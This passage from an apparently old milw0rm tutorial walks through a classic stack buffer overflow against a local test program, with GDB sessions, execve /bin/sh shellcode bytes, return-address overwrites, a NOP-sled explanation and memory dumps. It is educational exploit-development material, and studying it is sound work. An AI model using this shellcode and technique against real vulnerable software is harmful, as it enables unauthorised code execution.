+Backing to GDB again.
+ 
+(gdb) run `perl -e 'print "A"x244,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80","\x64\xfc\xff\xbf" '`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e 'print "A"x244,"\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80","\x64\xfc\xff\xbf"'`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 <main+27>:       call   0x80483c4 <bof>
+(gdb) c
+Continuing.
+ 
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000c20 in ?? () from /lib/ld-linux.so.2
+1: x/i $eip  0x40000c20 <completed.1+939226576>:        mov    %esp,%eax
+(gdb) c
+Continuing.
+sh-2.05b$
+ 
+Our shellcode was sucessfuly executed.
+ 
+Now the stack layout after success execution:
+ 
+                 32 bits
+0xbfffffff ------------------------- -------------------------+
+           |                        |  bof()                  |
+           | char *string           |                         |
+           |                        |                         |
+           |------------------------|      NEW STACK FRAME    |
+           | SAVED EIP (0xbffffc64) |<--+                     |
+           |------------------------|   |                     |
+           | SAVED EBP (0x80cd0bb0) |   |                     |
+           |------------------------| --|---------------------|
+           | SHELLCODE              |<--+   Malicous buffer   |
+           |------------------------|   |     (272bytes)      |
+           | A x 244                |   |                     |
+           |------------------------|---+---------------------+
+           |                        |
+           |------------------------|
+           | .text                  |
+           |------------------------|
+           | call bof() @ main      |
+0x08040000 |------------------------|
+           |                        |
+           |------------------------|
+           | shared libraries       |
+0x08000000 |------------------------|
+ 
+The NOP idea is simple. A NOP is an instruction that does nothing. 
+It only takes up space. (Incidentally, the NOP was originally created 
+for debugging.) Since the NOP is only a single byte long, it is immune 
+to the problems of byte ordering and alignment issues.
+The trick involves filling our buffer with NOPs before the actual payload. If
+we incorrectly guess the address of the payload, it will not matter, as long as we
+guess an address that points somewhere in a NOP sled. Since the entire buffer is
+full of NOPs, we can guess any address that lands in the buffer. Once we land
+on a NOP, we will begin executing each NOP. We slide forward over all the
+NOPs until we reach our actual payload. The larger the buffer of NOPs, the less
+precise we need to be when guessing the address of our payload. Let's see:
+ 
+(gdb) run `perl -e 'print "\x90"x244,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80","CCCC"'`
+Starting program: /home/xgc/simple_stack `perl -e 'print "\x90"x244,"\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80","CCCC"'`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 <main+27>:       call   0x80483c4 <bof>
+(gdb) c
+Continuing.
+ 
+Program received signal SIGSEGV, Segmentation fault.
+0x43434343 in ?? ()
+1: x/i $eip  0x43434343:        add    %al,(%eax)
+(gdb) x/128xb $esp
+          .
+          .
+          .
+0xbffffc30:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc38:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc40:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc48:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc50:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc58:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbffffc60:     0x90    0x90    0x90    0x90    0x31    0xc0    0x50    0x68
+0xbffffc68:     0x2f    0x2f    0x73    0x68    0x68    0x2f    0x62    0x69
+0xbffffc70:     0x6e    0x89    0xe3    0x50    0x53    0x89    0xe1    0x99
+0xbffffc78:     0xb0    0x0b    0xcd    0x80    0x43    0x43    0x43    0x43
+ 
+Shellcode address can be now any address of NOP. Let's choice 0xbffffc38,
+insert at our cdm line in GDB, in little endian format, and re-execute GDB.
+  
+(gdb) run `perl -e 'print "A"x244,"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53
+\x89\xe1\x99\xb0\x0b\xcd\x80","\x38\xfc\xff\xbf"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+ 
+Starting program: /home/xgc/simple_stack `perl -e 'print "A"x244,"\x31\xc0\x50\x68
+//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80","\x38\xfc\xff\xbf"'`
+ 
+Breakpoint 1, 0x08048404 in main ()
+1: x/i $eip  0x8048404 <main+27>:       call   0x80483c4 <bof>
+(gdb) c
+Continuing.
+ 
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000c20 in ?? () from /lib/ld-linux.so.2
+1: x/i $eip  0x40000c20 <completed.1+939226576>:        mov    %esp,%eax
+(gdb) c
+Continuing.
+sh-2.05b$
+  
+Our shellcode was sucessfuly executed.
+ 
+ 
+---------[ 0x1b0 - Conclusion ]
+ 
+I've described the most known and basic stack overflow module. Different methods
+can be used if the buffer isn't big enough for the shellcode or if some Stack
+protections are installed. Coming soon theses methods will be described also.
+ 
+|=-----------------------------------------------------------------------------=|
+
+
+# milw0rm.com [2006-03-09]
